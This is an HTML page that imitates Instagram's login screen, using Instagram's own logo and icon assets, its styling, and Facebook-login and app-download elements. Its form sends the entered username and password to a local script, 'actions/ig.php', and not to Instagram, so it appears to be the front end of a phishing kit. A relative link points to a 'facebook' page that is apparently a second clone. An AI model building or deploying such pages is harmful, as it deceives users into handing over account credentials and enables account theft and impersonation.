<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins">
    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico"/>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #fafafa;
        }
        .login-box {
            font-family: Poppins !important;

            width: 360px;
            margin: 100px auto;
            margin-bottom: 10px;
            padding: 40px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            text-align: center;
        }

        .app-box {
            font-family: Poppins !important;

            width: 360px;
            margin: 10px auto;
            padding: 40px;
            text-align: center;
        }
        .login-box h1 {
            font-family: Poppins !important;
            font-size: 3rem;
            margin-bottom: 20px;
        }
        .login-box form {
            margin-bottom: 10px;
        }
        .login-box input[type="text"],
        .login-box input[type="password"] {
            width: 100%;
            margin-bottom: 10px;
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
        }
        .login-box button {
            width: 100%;
            padding: 6px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 9px;
            cursor: not-allowed;
        }
        .login-box button:disabled {
            background-color: #b2dffc;
        }
        input{
            font-size: 12px !important;

        }

        .login-box a {
            text-decoration: none;
            color: #385185;
        }
        .app-buttons img {
            width: 140px;
            margin: 5px;
        }
        .footer {
            margin-top: 20px;
        }

        .or-separator {
            display: flex;
            align-items: center;
            text-align: center;
        }
        .or-separator::before, .or-separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #ccc;
        }
        .or-separator:not(:empty)::before {
            margin-right: .5em;
        }
        .or-separator:not(:empty)::after {
            margin-left: .5em;
        }
    </style>
</head>
<body>

<div class="login-box">
        <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yv/r/KoLLpWDb4f6.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>    
     <form action="actions/ig.php" method="post">
        <input type="text" class="mb-3 mt-4" id="username" name="username" placeholder="Phone number, username, or email">
        <input type="password" id="password" name="password" placeholder="Password">
        <button type="submit" class=" mt-3" id="login-button">Log in</button>
     </form>
    <div class="mb-3">
    <div class="or-separator mt-3 mb-3">
                OR
            </div>
     <a href="facebook" style="color: black !important; font-size: 14px;"><img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" style="width: 20px; "> Log in with Facebook</a>
    </div>
    <a href="https://www.instagram.com/accounts/password/reset/" style="font-size: 14px; color: black;">Forgot password?</a>
    
    
</div>
<div class="app-buttons  app-box">
<p style="color: black !important; font-size: 14px;">Get the app</p>
<div class="d-flex gap-2">
    <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/f7/Get_it_from_Microsoft_Badge.svg" style="width: 130px !important;" alt="Get it from Microsoft">
</div>
        
    </div>

<script>
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginButton = document.getElementById('login-button');

    // Function to check if the login button should be enabled
    function validateForm() {
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();
        
        // Username must be more than 3 characters, password more than 6 characters
        if (username.length > 3 && password.length > 6) {
            loginButton.disabled = false;
            loginButton.style.cursor = 'pointer';
        } else {
            loginButton.disabled = true;
            loginButton.style.cursor = 'not-allowed';
        }
    }

    // Add event listeners to the input fields to validate as the user types
    usernameInput.addEventListener('input', validateForm);
    passwordInput.addEventListener('input', validateForm);

    // Run the form validation once when the page loads
    document.addEventListener('DOMContentLoaded', validateForm);
</script>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
